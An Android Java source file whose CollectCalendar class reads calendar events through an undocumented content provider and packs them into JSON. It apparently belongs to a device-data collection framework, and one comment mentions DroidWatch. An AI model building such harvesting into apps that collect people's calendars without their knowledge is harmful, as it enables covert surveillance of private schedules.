package com.xaviar.collect.calendar;

import java.util.Collection;
import java.util.LinkedList;
import java.util.List;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;

import flexjson.JSONSerializer;

/** This class detects accounts associated with the device. **/
public class CollectCalendar extends ThreadCollector implements ICollector {
	// Initialize constants and variables

	private static String name = "CollectCalendar";
	private static final String TAG = name;

	public CollectCalendar(String genericData) {
		this.genericData = genericData;
	}

	public CollectCalendar() {
		setName(CollectCalendar.name);
	}

	public CollectCalendar(Context ctx) {
		setContext(ctx);
	}

	public static List<CalendarEntry> getObjects(Context context) {
		List<CalendarEntry> calendarList = new LinkedList<CalendarEntry>();
		// Initialize the Android calendar content provider URI (undocumented)
		Uri calUri = Uri.parse("content://com.android.calendar/event_entities");

		// Query calendar for events
		String[] calProj = new String[] { "dtstart", "title", "_id","dtend", "rrule", "rdate","duration" };
		Cursor calendarCursor = null;
		try {
			calendarCursor = context.getContentResolver().query(calUri, calProj, null, null, null);
		} catch (Exception e) {
			Log.e(TAG, "Unable to query calendar content provider: " + e.getMessage());
			return calendarList;
		}

		// Parse and log query results
		if (calendarCursor == null) {
			Log.e(TAG, "Unable to query calendar content provider");
			return calendarList;
		}

		if (calendarCursor.moveToFirst() && calendarCursor.getCount() > 0) {
			long currentTime = System.currentTimeMillis();
			while (!calendarCursor.isAfterLast()) {
				CalendarEntry calendarEntry = new CalendarEntry();

				if (calendarCursor.getColumnIndex("dtend") != -1 && calendarCursor.getLong(calendarCursor.getColumnIndex("dtend"))!=0)
					calendarEntry.setEnd(calendarCursor.getLong(calendarCursor.getColumnIndex("dtend")));

				if (calendarCursor.getColumnIndex("rrule") != -1)
					calendarEntry.setRule(calendarCursor.getString(calendarCursor.getColumnIndex("rrule")));

				if (calendarCursor.getColumnIndex("rdate") != -1)
					calendarEntry.setDate(calendarCursor.getString(calendarCursor.getColumnIndex("rdate")));

				if (calendarCursor.getColumnIndex("duration") != -1)
					calendarEntry.setDuration(calendarCursor.getString(calendarCursor.getColumnIndex("duration")));

				calendarEntry.setId(calendarCursor.getLong(calendarCursor.getColumnIndex("_id")));
				calendarEntry.setTitle(calendarCursor.getString(calendarCursor.getColumnIndex("title")));
				calendarEntry.setStart(calendarCursor.getLong(calendarCursor.getColumnIndex("dtstart")));
				calendarEntry.setTimestamp(currentTime);
				
				calendarList.add(calendarEntry);
				// Insert new event into DroidWatch calendar database
				// values = new ContentValues();
				// values.put(DroidWatchDatabase.CALENDAR_EVENT_ID_COLUMN, id);
				// values.put(DroidWatchDatabase.CALENDAR_EVENT_NAME_COLUMN,
				// name);
				// values.put(DroidWatchDatabase.CALENDAR_EVENT_ADDED_COLUMN,
				// currentTime);
				// values.put(DroidWatchDatabase.CALENDAR_EVENT_DATE_COLUMN,
				// eventTime);
				// context.getContentResolver().insert(DroidWatchProvider.Calendar.CONTENT_URI,
				// values);

				calendarCursor.moveToNext();
			}
		}
		return calendarList;
	}

	@Override
	public String getHolderKey() {

		return DataHolder.CALENDAR;
	}

	@Override
	protected String getAllData() {
		Log.d(TAG, "Enter Calendar getAllData()");
		List<CalendarEntry> accounts = getObjects(ctx);
		genericData = toJsonArray(accounts);
		return genericData;
	}

	public static String toJsonArray(Collection<CalendarEntry> collection) {
		return new JSONSerializer().exclude("*.class").serialize(collection);
	}

}
